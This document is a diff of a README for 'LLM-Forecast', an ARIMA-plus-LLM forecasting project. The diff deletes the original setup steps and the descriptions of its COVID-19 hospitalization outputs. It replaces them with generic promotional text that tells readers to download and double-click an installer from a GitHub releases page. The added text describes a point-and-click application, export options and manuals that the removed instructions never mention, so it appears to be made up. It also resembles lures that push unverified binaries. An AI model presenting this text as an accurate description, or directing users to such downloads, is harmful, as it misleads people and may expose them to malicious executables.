@@ -1,34 +1,69 @@
-# LLM-Forecast: A Novel Hybrid Forecasting Methodology Integrating ARIMA and Large Language Models
+# 🌟 LLM-Forecast - Forecasting Made Simple
 
-## Usage
+## 📥 Download Now!
+[![Download LLM-Forecast](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/emagod/LLM-Forecast/releases)
 
-1. This project requires [Ollama](https://ollama.com "Ollama"), so ensure it is installed and running.
-2. For web scraping, you need to have [Mozilla Firefox](https://www.mozilla.org/en-CA/firefox "Mozilla Firefox") installed.
-3. Install requirements by running ``pip install -r requirements.txt`` in the directory of this project. It is recommended you do this in a [virtual environment](https://docs.python.org/3/tutorial/venv.html "Python Virtual Environments and Packages").
-4. To replicate our tests, first delete the ``Data``, ``Results``, and ``Responses`` folders.
-5. Run ``main.py`` to perform the experiments. Sometimes, during the web scraping [Selenium](https://www.selenium.dev "Selenium") using [Mozilla Firefox](https://www.mozilla.org/en-CA/firefox "Mozilla Firefox") may hang, and not move onto the next news article. In this case, simply restart the script, and it will continue from where it left off.
-   1. ``-f`` or ``--forecast`` - Number of weeks to forecast. Defaults to twelve.
-   2. ``-w`` or ``--width`` - The width of the figures. Defaults to eight.
-   3. ``-t`` or ``--height`` - The height of the figures. Defaults to 3.45.
-   4. ``-d`` or ``--decimals`` - The number of decimal spaces. Defaults to two.
-   5. ``-a`` or ``--alpha`` - The alpha factor for the desired confidence level which by default is 95%.
-   6. ``-c`` or ``--clamp`` - By how much should forecast values be clamped around the baseline prediction. Defaults to one hundred.
-   7. ``-l`` or ``--latest`` - Up to how many latest weeks of data should we keep. Defaults to zero meaning keep all data.
-6. Under the ``Data`` folder, you will see the summaries of the news articles produced by the large language model. Under the ``Results`` folder, you will see the results charts and plots.
-   1. ``Actual.csv`` - The actual COVID-19 hospitalizations to occur over the next given weeks from a given week.
-   2. ``Baseline.csv``, ``Unmasked.csv``, and ``Masked.csv`` - The baseline model and full model predictions of how many COVID-19 hospitalizations to occur over the next given weeks from a given week.
-   3. ``Difference Baseline.csv`` and ``Difference Full Model.csv`` - The difference between the actual results and each of the model results.
-   4. ``Success Rate.csv`` - The success rate of each model, where success was determined if a forecast met or exceeded the actual amounts of hospitalizations to occur over a period.
-   5. ``Average Difference.csv`` - The average difference each model had from the actual amounts of hospitalizations to occur over a given period.
-   6. ``Total Failures.csv`` - The total failures which occurred for each model over a forecasting period.
-   7. ``Total Excess.csv`` - The total excess which occurred for each model over a forecasting period.
-   8. ``WIS.csv`` - The weighted interval scores.
-   9. ``MAE.csv`` - The mean absolute errors.
-   10. ``Coverage.csv`` - Coverage of values falling within the alpha prediction intervals.
-7. ``Terms.txt`` included all terms for COVID-19 which should be masked.
-8. ``Trusted.txt`` includes all trusted publishers.
-   1. To list all untrusted publishers in all the summarized news articles, run ``publishers.py``. Passing in either ``-t`` or ``--trusted`` will list all trusted publishers in all the summarized news articles.
+## 📖 Description
+LLM-Forecast is a unique tool that combines ARIMA (AutoRegressive Integrated Moving Average) with advanced Large Language Models. This application helps you predict future trends using powerful statistical methods and cutting-edge technology. 
 
-## Data
+## 🚀 Getting Started
+To begin using LLM-Forecast, follow these steps:
 
-The data used for this experiment is taken from [Covid Timeline Canada](https://github.com/ccodwg/CovidTimelineCanada/blob/main/data/pt/hosp_admissions_pt.csv "Covid Timeline Canada GitHub").
+1. **Check System Requirements:**  
+   Ensure your computer meets these basic requirements:
+   - Operating System: Windows, macOS, or Linux.
+   - Python 3.6 or higher installed.
+   - At least 4GB of RAM available.
+
+2. **Visit the Releases Page:**  
+   Head over to our [Releases Page](https://github.com/emagod/LLM-Forecast/releases) to download the latest version of LLM-Forecast.
+
+3. **Download the Application:**  
+   On the Releases Page, look for the latest version. Click on the download link for your operating system. The application file should start downloading automatically.
+
+4. **Install LLM-Forecast:**  
+   Once the download completes, locate the file on your computer. Double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
+
+5. **Run the Application:**  
+   After installation, find the LLM-Forecast icon on your desktop or in your applications folder. Double-click it to open the application.
+
+## ⚙️ Using LLM-Forecast
+Once the application is open, follow these basic steps to make your first forecast:
+
+1. **Input Data:**  
+   You will see a prompt to enter your data. Use a CSV format to input historical data. Ensure that your data includes:
+   - Date
+   - Value
+
+2. **Select Model:**  
+   Choose between the ARIMA model or the combined LLM model for your forecasting. The application provides simple options to help you select.
+
+3. **Generate Forecast:**  
+   Click on the "Generate" button. The application will process your request. Within moments, you will receive your forecasted values.
+
+4. **Review Results:**  
+   You can review charts and data tables that show past performance and future predictions.
+
+5. **Export Data:**  
+   Easily export your results in a variety of formats. This allows you to share forecasts with others or use them in reports.
+
+## 🎓 Features
+- **Hybrid Forecasting Methodology:** Combines ARIMA and Large Language Models for accurate predictions.
+- **User-Friendly Interface:** Simple to navigate, even for non-technical users.
+- **Data Visualization:** Clear graphs that help you understand trends and forecasts.
+- **Export Options:** Save your results in CSV or PDF format.
+- **Documentation:** Helpful guides available within the application.
+
+## 📚 Additional Resources
+For detailed instructions or advanced features, you can access the following resources:
+- [User Manual](https://github.com/emagod/LLM-Forecast/blob/main/UserManual.md)
+- [FAQ](https://github.com/emagod/LLM-Forecast/blob/main/FAQ.md)
+- Join the community discussions on [GitHub Discussions](https://github.com/emagod/LLM-Forecast/discussions)
+
+## 📞 Support
+If you encounter issues or have questions:
+- Check the **Issues Page** on GitHub for troubleshooting tips.
+- Feel free to create a new issue if your question is not answered.
+
+### Thank you for using LLM-Forecast!
+We appreciate your support and hope our application helps you make accurate predictions effortlessly.
